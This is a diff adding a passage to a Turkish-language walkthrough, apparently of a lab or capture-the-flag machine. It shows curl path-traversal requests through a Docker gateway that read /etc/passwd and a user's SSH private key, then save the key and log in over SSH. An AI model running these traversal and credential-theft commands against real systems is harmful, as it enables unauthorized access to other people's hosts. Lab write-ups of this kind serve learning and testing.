@@ -152,7 +152,70 @@ cat requirements.txt
 `sudo -l` denemesi bu noktada sonuç vermiyor.
 
 
+---
 
+## İç Ağda SSRF / Path Traversal ile Credential Sızıntısı
+
+### 12 — SSRF ile /etc/passwd Okuma
+
+```bash
+curl -s --path-as-is 'http://172.17.0.1:3000/../../../../etc/passwd'
+```
+
+![curl passwd ssrf](images/12.png)
+
+`172.17.0.1`, Docker bridge network'ünün gateway IP'si — yani bu, container'ın **dışarıdan erişilemeyen host/iç ağ** tarafına bakan adresi.
+`--path-as-is` flag'i, curl'ün normalde temizleyeceği `../../../../` path traversal dizilerini **olduğu gibi** göndermemizi sağlıyor.
+Çıktıda dikkat çeken kullanıcı: **`developer`** (uid=1000, `/home/developer`, `/bin/bash` shell) — gerçek, etkileşimli giriş yapabilen bir sistem kullanıcısı.
+
+
+### 13 — Aynı Path Traversal ile SSH Private Key Sızıntısı
+
+```bash
+curl -s --path-as-is 'http://172.17.0.1:3000/../../../../home/developer/.ssh/id_rsa'
+```
+
+![curl id_rsa](images/13.png)
+
+Aynı zafiyeti kullanarak bu sefer `developer` kullanıcısının **SSH private key'ini** (`id_rsa`) doğrudan okuyoruz.
+
+
+### 14 — Private Key'i Kaydetme
+
+![mkdir nano key](images/14.png)
+
+Sızdırdığımız private key'i kendi makinemizde bir dosyaya kaydediyoruz:
+
+```bash
+mkdir -p bedsideee
+cd bedsideee
+nano id_rsa
+```
+
+Çıktıdaki key içeriğini 'id_rsa' dosyasına yapıştırıp kaydediyoruz.
+
+
+### 15 — Dosya İzinlerini Düzeltme
+
+![cat chmod key](images/15.png)
+
+```bash
+cat id_rsa
+chmod 600 id_rsa
+```
+
+SSH, private key dosyasının izinlerinin açık olmasına izin vermiyor — bu yüzden `chmod 600` ile sadece sahibinin okuyup yazabileceği şekilde kısıtlıyoruz.
+
+
+### 16 — SSH ile developer Kullanıcısına Bağlanma
+
+```bash
+ssh -i id_rsa developer@10.129.177.38
+```
+
+![ssh developer](images/16.png)
+
+Sızdırdığımız key ile host makineye (container'ın dışına) **`developer`** kullanıcısı olarak bağlanıyoruz.
 
 
 
